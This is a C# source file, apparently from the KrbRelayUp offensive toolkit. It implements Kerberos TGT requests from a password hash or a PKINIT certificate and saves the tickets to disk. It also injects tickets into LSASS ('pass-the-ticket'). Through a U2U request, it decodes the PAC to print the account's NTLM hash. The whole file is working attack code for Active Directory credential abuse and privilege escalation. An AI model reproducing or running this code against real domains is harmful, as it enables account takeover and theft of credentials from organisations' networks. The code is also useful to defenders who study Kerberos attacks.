using Asn1;
using KrbRelayUp.Asn1;
using KrbRelayUp.Kerberos;
using KrbRelayUp.Kerberos.PAC;
using KrbRelayUp.lib.Interop;
using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography.X509Certificates;

namespace KrbRelayUp
{
    public class KrbRelayUpException : Exception
    {
        public KrbRelayUpException(string message)
            : base(message)
        {
        }
    }

    public class KerberosErrorException : KrbRelayUpException
    {
        public KRB_ERROR krbError;

        public KerberosErrorException(string message, KRB_ERROR krbError)
            : base(message)
        {
            this.krbError = krbError;
        }
    }

    class AskTGT
    {
        public static byte[] TGT(string userName, string domain, string keyString, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool opsec = false, string servicekey = "", bool changepw = false, bool pac = true, string proxyUrl = null)
        {
            AS_REQ userHashASREQ = AS_REQ.NewASReq(userName, domain, keyString, etype, opsec, changepw, pac);
            try
            {
                return InnerTGT(userHashASREQ, etype, outfile, ptt, domainController, luid, describe, true, opsec, servicekey, false, proxyUrl);
            }
            catch (KerberosErrorException ex)
            {
                KRB_ERROR error = ex.krbError;
                try
                {
                    Console.WriteLine("\r\n[-] KRB-ERROR ({0}) : {1}: {2}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code, error.e_text);
                }
                catch
                {
                    Console.WriteLine("\r\n[-] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
                }
            }
            catch (KrbRelayUpException ex)
            {
                Console.WriteLine(ex.Message + "\r\n");
            }
            catch (Exception ex)
            {
                Console.WriteLine("\r\n" + ex.Message + "\r\n");
            }
            Environment.Exit(0);
            return null;
        }

        public static byte[] TGT(string userName, string domain, string certFile, string certPass, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verifyCerts = false, string servicekey = "", bool getCredentials = false, string proxyUrl = null)
        {
            try
            {
                X509Certificate2 cert = null;

                if (Helpers.IsBase64String(certFile))
                {
                    cert = new X509Certificate2(Convert.FromBase64String(certFile), certPass);
                }
                else if (File.Exists(certFile))
                {
                    cert = new X509Certificate2(File.ReadAllBytes(certFile), certPass);
                }

                if (cert == null)
                {
                    Console.WriteLine("[-] Failed to load certificate");
                    return null;
                }

                KDCKeyAgreement agreement = new KDCKeyAgreement();

                Console.WriteLine("[+] Using PKINIT with etype {0} and subject: {1} ", etype, cert.Subject);
                Console.WriteLine("[+] Building AS-REQ (w/ PKINIT preauth) for: '{0}\\{1}'", domain, userName);

                AS_REQ pkinitASREQ = AS_REQ.NewASReq(userName, domain, cert, agreement, etype, verifyCerts);
                return InnerTGT(pkinitASREQ, etype, outfile, ptt, domainController, luid, describe, true, false, servicekey, getCredentials, proxyUrl);

            }
            catch (KerberosErrorException ex)
            {
                KRB_ERROR error = ex.krbError;
                Console.WriteLine("[-] KRB-ERROR ({0}) : {1}", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
            }
            catch (KrbRelayUpException ex)
            {
                Console.WriteLine("[-] " + ex.Message);
            }

            return null;
        }

        public static byte[] InnerTGT(AS_REQ asReq, Interop.KERB_ETYPE etype, string outfile, bool ptt, string domainController = "", LUID luid = new LUID(), bool describe = false, bool verbose = false, bool opsec = false, string serviceKey = "", bool getCredentials = false, string proxyUrl = null)
        {
            byte[] response = null;
            string dcIP = null;
            
            if (String.IsNullOrEmpty(proxyUrl))
            {
                dcIP = Networking.GetDCIP(domainController, false, asReq.req_body.realm);
                if (String.IsNullOrEmpty(dcIP))
                {
                    throw new Exception("[-] Unable to get domain controller address");
                }

                response = Networking.SendBytes(dcIP, 88, asReq.Encode().Encode());
            }
            else
            {
                KDC_PROXY_MESSAGE message = new KDC_PROXY_MESSAGE(asReq.Encode().Encode());
                message.target_domain = asReq.req_body.realm;
                response = Networking.MakeProxyRequest(proxyUrl, message);
            }
            if (response == null)
            {
                throw new Exception("[-] No answer from domain controller");
            }

            // decode the supplied bytes to an AsnElt object
            AsnElt responseAsn;
            try
            {
                responseAsn = AsnElt.Decode(response);
            }
            catch (Exception e)
            {
                throw new Exception($"Error parsing response AS-REQ: {e}.  Base64 response: {Convert.ToBase64String(response)}");
            }

            // check the response value
            int responseTag = responseAsn.TagValue;
            
            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)
            {
                if (verbose)
                {
                    Console.WriteLine("[+] TGT request successful!");
                }
                
                byte[] kirbiBytes = HandleASREP(responseAsn, etype, asReq.keyString, outfile, ptt, luid, describe, verbose, asReq, serviceKey, getCredentials, dcIP);
                return kirbiBytes;
            }
            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
            {
                // parse the response to an KRB-ERROR
                KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
                throw new KerberosErrorException("", error);
            }
            else
            {
                throw new Exception("[-] Unknown application tag: " + responseTag);
            }
        }

        private static byte[] HandleASREP(AsnElt responseAsn, Interop.KERB_ETYPE etype, string keyString, string outfile, bool ptt, LUID luid = new LUID(), bool describe = false, bool verbose = false, AS_REQ asReq = null, string serviceKey = "", bool getCredentials = false, string dcIP = "")
        {
            // parse the response to an AS-REP
            AS_REP rep = new AS_REP(responseAsn);

            // convert the key string to bytes
            byte[] key;
            if (GetPKInitRequest(asReq, out PA_PK_AS_REQ pkAsReq))
            {
                // generate the decryption key using Diffie Hellman shared secret 
                PA_PK_AS_REP pkAsRep = (PA_PK_AS_REP)rep.padata[0].value;
                key = pkAsReq.Agreement.GenerateKey(pkAsRep.DHRepInfo.KDCDHKeyInfo.SubjectPublicKey.DepadLeft(), Array.Empty<byte>(),
                    pkAsRep.DHRepInfo.ServerDHNonce, GetKeySize(etype));
            }
            else
            {
                // convert the key string to bytes
                key = Helpers.StringToByteArray(keyString);
            }

            if (rep.enc_part.etype != (int)etype)
            {
                // maybe this should be a fatal error instead of just a warning?
                Console.WriteLine($"[!] Warning: Supplied encryption key type is {etype} but AS-REP contains data encrypted with {(Interop.KERB_ETYPE)rep.enc_part.etype}");
            }

            // decrypt the enc_part containing the session key/etc.

            byte[] outBytes;

            if (etype == Interop.KERB_ETYPE.des_cbc_md5)
            {
                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
                outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
            }
            else if (etype == Interop.KERB_ETYPE.rc4_hmac)
            {
                // KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY = 8
                outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
            }
            else if (etype == Interop.KERB_ETYPE.aes128_cts_hmac_sha1)
            {
                // KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY = 3
                outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
            }
            else if (etype == Interop.KERB_ETYPE.aes256_cts_hmac_sha1)
            {
                // KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY = 3
                outBytes = Crypto.KerberosDecrypt(etype, Interop.KRB_KEY_USAGE_AS_REP_EP_SESSION_KEY, key, rep.enc_part.cipher);
            }
            else
            {
                throw new Exception("[-] Encryption type \"" + etype + "\" not currently supported");
            }

            AsnElt ae = null;
            bool decodeSuccess = false;
            try
            {
                ae = AsnElt.Decode(outBytes);
                // Make sure the data has expected value so we know decryption was successful (from kerberos spec: EncASRepPart ::= [APPLICATION 25] )
                if (ae.TagValue == 25)
                {
                    decodeSuccess = true;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Error parsing encrypted part of AS-REP: " + ex.Message);
            }

            if (decodeSuccess == false)
            {
                Console.WriteLine($"[-] Failed to decrypt TGT using supplied password/hash. If this TGT was requested with no preauth then the password supplied may be incorrect or the data was encrypted with a different type of encryption than expected");
                return null;
            }

            EncKDCRepPart encRepPart = new EncKDCRepPart(ae.Sub[0]);

            // now build the final KRB-CRED structure
            KRB_CRED cred = new KRB_CRED();

            // add the ticket
            cred.tickets.Add(rep.ticket);

            // build the EncKrbCredPart/KrbCredInfo parts from the ticket and the data in the encRepPart

            KrbCredInfo info = new KrbCredInfo();

            // [0] add in the session key
            info.key.keytype = encRepPart.key.keytype;
            info.key.keyvalue = encRepPart.key.keyvalue;

            // [1] prealm (domain)
            info.prealm = encRepPart.realm;

            // [2] pname (user)
            info.pname.name_type = rep.cname.name_type;
            info.pname.name_string = rep.cname.name_string;

            // [3] flags
            info.flags = encRepPart.flags;

            // [4] authtime (not required)

            // [5] starttime
            info.starttime = encRepPart.starttime;

            // [6] endtime
            info.endtime = encRepPart.endtime;

            // [7] renew-till
            info.renew_till = encRepPart.renew_till;

            // [8] srealm
            info.srealm = encRepPart.realm;

            // [9] sname
            info.sname.name_type = encRepPart.sname.name_type;
            info.sname.name_string = encRepPart.sname.name_string;

            // add the ticket_info into the cred object
            cred.enc_part.ticket_info.Add(info);

            byte[] kirbiBytes = cred.Encode().Encode();

            if (!String.IsNullOrEmpty(outfile))
            {
                outfile = Helpers.MakeValidFileName(outfile);
                if (Helpers.WriteBytesToFile(outfile, kirbiBytes))
                {
                    if (verbose)
                    {
                        Console.WriteLine("\r\n[+] Ticket written to {0}\r\n", outfile);
                    }
                }
            }

            if (ptt || (luid != 0))
            {
                // pass-the-ticket -> import into LSASS
                LSA.ImportTicket(kirbiBytes, luid);
            }

            if (describe)
            {
                KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                //LSA.DisplayTicket(kirbi, 2, false, false, false, false, string.IsNullOrEmpty(serviceKey) ? null : Helpers.StringToByteArray(serviceKey), key);
            }

            if (getCredentials)
            {
                Console.WriteLine("[+] Getting credentials using U2U\r\n");
                byte[] u2uBytes = TGS_REQ.NewTGSReq(info.pname.name_string[0], info.prealm, info.pname.name_string[0], cred.tickets[0], info.key.keyvalue, (Interop.KERB_ETYPE)info.key.keytype, Interop.KERB_ETYPE.subkey_keymaterial, false, String.Empty, false, false, false, false, cred, "", true);
                byte[] u2uResponse = Networking.SendBytes(dcIP, 88, u2uBytes);
                if (u2uResponse == null)
                {
                    return null;
                }
                AsnElt u2uResponseAsn = AsnElt.Decode(u2uResponse);

                // check the response value
                int responseTag = u2uResponseAsn.TagValue;

                if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.TGS_REP)
                {
                    // parse the response to an TGS-REP and get the PAC
                    TGS_REP u2uRep = new TGS_REP(u2uResponseAsn);
                    EncTicketPart u2uEncTicketPart = u2uRep.ticket.Decrypt(info.key.keyvalue, key);
                    PACTYPE pt = u2uEncTicketPart.GetPac(key);

                    // look for the credential information and print
                    foreach (var pacInfoBuffer in pt.PacInfoBuffers)
                    {
                        if (pacInfoBuffer is PacCredentialInfo ci)
                        {

                            Console.WriteLine("  CredentialInfo         :");
                            Console.WriteLine("    Version              : {0}", ci.Version);
                            Console.WriteLine("    EncryptionType       : {0}", ci.EncryptionType);

                            if (ci.CredentialInfo.HasValue)
                            {

                                Console.WriteLine("    CredentialData       :");
                                Console.WriteLine("      CredentialCount    : {0}", ci.CredentialInfo.Value.CredentialCount);

                                foreach (var credData in ci.CredentialInfo.Value.Credentials)
                                {
                                    string hash = "";
                                    if ("NTLM".Equals(credData.PackageName.ToString()))
                                    {
                                        int version = BitConverter.ToInt32((byte[])(Array)credData.Credentials, 0);
                                        int flags = BitConverter.ToInt32((byte[])(Array)credData.Credentials, 4);
                                        if (flags == 3)
                                        {
                                            hash = $"{Helpers.ByteArrayToString(((byte[]) (Array) credData.Credentials).Skip(8).Take(16).ToArray())}:{Helpers.ByteArrayToString(((byte[]) (Array) credData.Credentials).Skip(24).Take(16).ToArray())}";
                                        }
                                        else
                                        {
                                            hash = $"{Helpers.ByteArrayToString(((byte[]) (Array) credData.Credentials).Skip(24).Take(16).ToArray())}";
                                        }
                                    }
                                    else
                                    {
                                        hash = Helpers.ByteArrayToString((byte[])(Array)credData.Credentials);
                                    }

                                    Console.WriteLine("       {0}              : {1}", credData.PackageName, hash);
                                }

                            }
                            else
                            {
                                Console.WriteLine("    CredentialData    :   *** NO KEY ***");
                            }
                        }
                    }
                }
                else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
                {
                    // parse the response to an KRB-ERROR
                    KRB_ERROR error = new KRB_ERROR(u2uResponseAsn.Sub[0]);
                    Console.WriteLine("\r\n[X] KRB-ERROR ({0}) : {1}\r\n", error.error_code, (Interop.KERBEROS_ERROR)error.error_code);
                }
                else
                {
                    Console.WriteLine("\r\n[X] Unknown application tag: {0}", responseTag);
                }
            }

            return kirbiBytes;
        }

        public static bool GetPKInitRequest(AS_REQ asReq, out PA_PK_AS_REQ pkAsReq)
        {

            if (asReq != null && asReq.padata != null)
            {
                foreach (PA_DATA paData in asReq.padata)
                {
                    if (paData.type == Interop.PADATA_TYPE.PK_AS_REQ)
                    {
                        pkAsReq = (PA_PK_AS_REQ)paData.value;
                        return true;
                    }
                }
            }
            pkAsReq = null;
            return false;
        }

        public static int GetKeySize(Interop.KERB_ETYPE etype)
        {
            switch (etype)
            {
                case Interop.KERB_ETYPE.des_cbc_md5:
                    return 7;
                case Interop.KERB_ETYPE.rc4_hmac:
                    return 16;
                case Interop.KERB_ETYPE.aes128_cts_hmac_sha1:
                    return 16;
                case Interop.KERB_ETYPE.aes256_cts_hmac_sha1:
                    return 32;
                default:
                    throw new ArgumentException("Only /des, /rc4, /aes128, and /aes256 are supported at this time");
            }
        }

    }
}
